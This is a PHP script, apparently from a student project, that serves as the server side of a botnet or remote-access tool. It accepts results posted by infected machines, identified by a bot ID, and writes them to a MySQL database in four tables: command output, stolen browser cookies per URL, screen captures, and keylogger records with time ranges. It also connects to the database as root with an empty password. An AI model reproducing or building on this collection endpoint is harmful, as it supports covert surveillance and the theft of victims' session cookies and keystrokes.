<?php
$db = new mysqli('localhost', 'root', '', 'pbl4_v2');
if (mysqli_connect_errno()) {
    // kiểm tra xem có lỗi khi kết nối đến cơ sở dữ liệu hay không
    exit;
}
$table = $_REQUEST["table"];
$idbot = $_REQUEST["idbot"];
$detail = $_REQUEST["detail"];
$content = $_REQUEST["content"];
if ($table == "cmd") {
    $query = "INSERT INTO cmd(IdBot,Cmd,CmdResult) VALUES(?,?,?)";
    $stmt = $db->prepare($query);
    $stmt->bind_param('sss', $idbot, $detail, $content);
    $stmt->execute();
} else if ($table == "cookies") {

    $query = "INSERT INTO cookies(IdBot,Url,CookiesResult) VALUES(?,?,?)";
    $stmt = $db->prepare($query);
    $stmt->bind_param('sss', $idbot, $detail, $content);
    $stmt->execute();
} else if ($table == "capture") {
    $currentDateTime = new DateTime();
    $currentDateTimeStr = $currentDateTime->format('Y-m-d H:i:s');
    $query = "INSERT INTO capture (IdBot, CaptureResult) VALUES (?, ?)";
    $stmt = $db->prepare($query);
    $stmt->bind_param('ss', $idbot, $content);
    $stmt->execute();
} else if ($table == "keylogger") {
    //detail: timeStart + ? + timeStop + ?
    $timeStart = explode("?", $detail)[0];
    $timeStop = explode("?", $detail)[1];
    $dateTimeStart = date_create($timeStart);
    $dateTimeStop = date_create($timeStop);
    $dateTimeStartStr = $dateTimeStart->format('Y-m-d H:i:s');
    $dateTimeStopStr = $dateTimeStop->format('Y-m-d H:i:s');
    $query = "INSERT INTO keylogger(IdBot,KeyloggerResult,TimeStart,TimeStop) VALUES (?, ?, ?, ?)";
    $stmt = $db->prepare($query);
    $stmt->bind_param('ssss', $idbot, $content, $dateTimeStartStr, $dateTimeStopStr);
    $stmt->execute();
}
$db->close();
//vvcvc